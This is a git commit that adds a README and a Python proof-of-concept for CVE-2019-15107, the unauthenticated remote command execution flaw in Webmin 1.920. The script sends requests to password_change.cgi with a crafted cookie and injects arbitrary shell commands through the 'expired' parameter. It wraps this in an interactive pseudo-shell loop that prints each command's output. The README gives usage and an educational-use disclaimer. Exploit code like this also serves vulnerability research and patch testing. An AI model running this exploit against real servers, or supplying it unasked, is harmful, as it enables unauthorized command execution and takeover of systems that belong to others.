f6f0cc575cb1ede1038516d9ee20f41e503d034c
Adrian <hadrian3689@gmail.com>
2022-02-21 15:27:16 -0500

    First commit, pseudo shell RCE

---
+++ README.md
@@ -0,0 +1,26 @@
+# Project Title
+
+CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution
+
+## Description
+
+A Pseudo-Shell for the CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution
+
+## Getting Started
+
+### Executing program
+
+* With python3
+```
+python3 webmin.py -t https://webmin.site/ 
+```
+
+## Help
+
+For help menu:
+```
+python3 webmin.py -h
+```
+
+## Disclaimer
+All the code provided on this repository is for educational/research purposes only. Any actions and/or activities related to the material contained within this repository is solely your responsibility. The misuse of the code in this repository can result in criminal charges brought against the persons in question. Author will not be held responsible in the event any criminal charges be brought against any individuals misusing the code in this repository to break the law.
---
+++ webmin.py
@@ -0,0 +1,57 @@
+import requests
+import argparse
+import re
+
+class Webmin():
+    def __init__(self,target):
+        self.target = target
+        self.url = self.url_fix()
+        self.exploit()
+        
+
+    def url_fix(self):
+        check = self.target[-1]
+        if check == "/": 
+            return self.target
+        else:
+            fixed_url = self.target + "/"
+            return fixed_url
+
+    def exploit(self):
+        requests.packages.urllib3.disable_warnings()
+        print("CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution")
+        print("Getting shell on target " + self.url)
+
+        pass_change_url = self.url + "password_change.cgi"
+        referer_url = self.url + "session_login.cgi"
+
+        exploit_headers = {
+            "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1;",
+            "Referer": referer_url
+        }
+
+        while True:
+            cmd = input("RCE: ")
+            post_data = {
+                "user":"bababooey",
+                "pam":"",
+                "expired":"2 | echo '';" + cmd 
+            }
+
+            req_site = requests.post(pass_change_url,data=post_data,headers=exploit_headers,verify=False)
+            search = re.compile(r"chosen.\s+(.*?)</p>",re.DOTALL) 
+            cmd_text = search.search(req_site.text).group(1)
+            print(cmd_text)
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='CVE-2019-15107 Webmin 1.920 Unauhenticated Remote Command Execution')
+
+    parser.add_argument('-t', metavar='<Target URL Path to CGI file>', help='Example: -t http://shock.me/', required=True)
+    args = parser.parse_args()
+    
+    try:
+        Webmin(args.t)
+    except KeyboardInterrupt:
+        print("Bye Bye!")
+        exit()
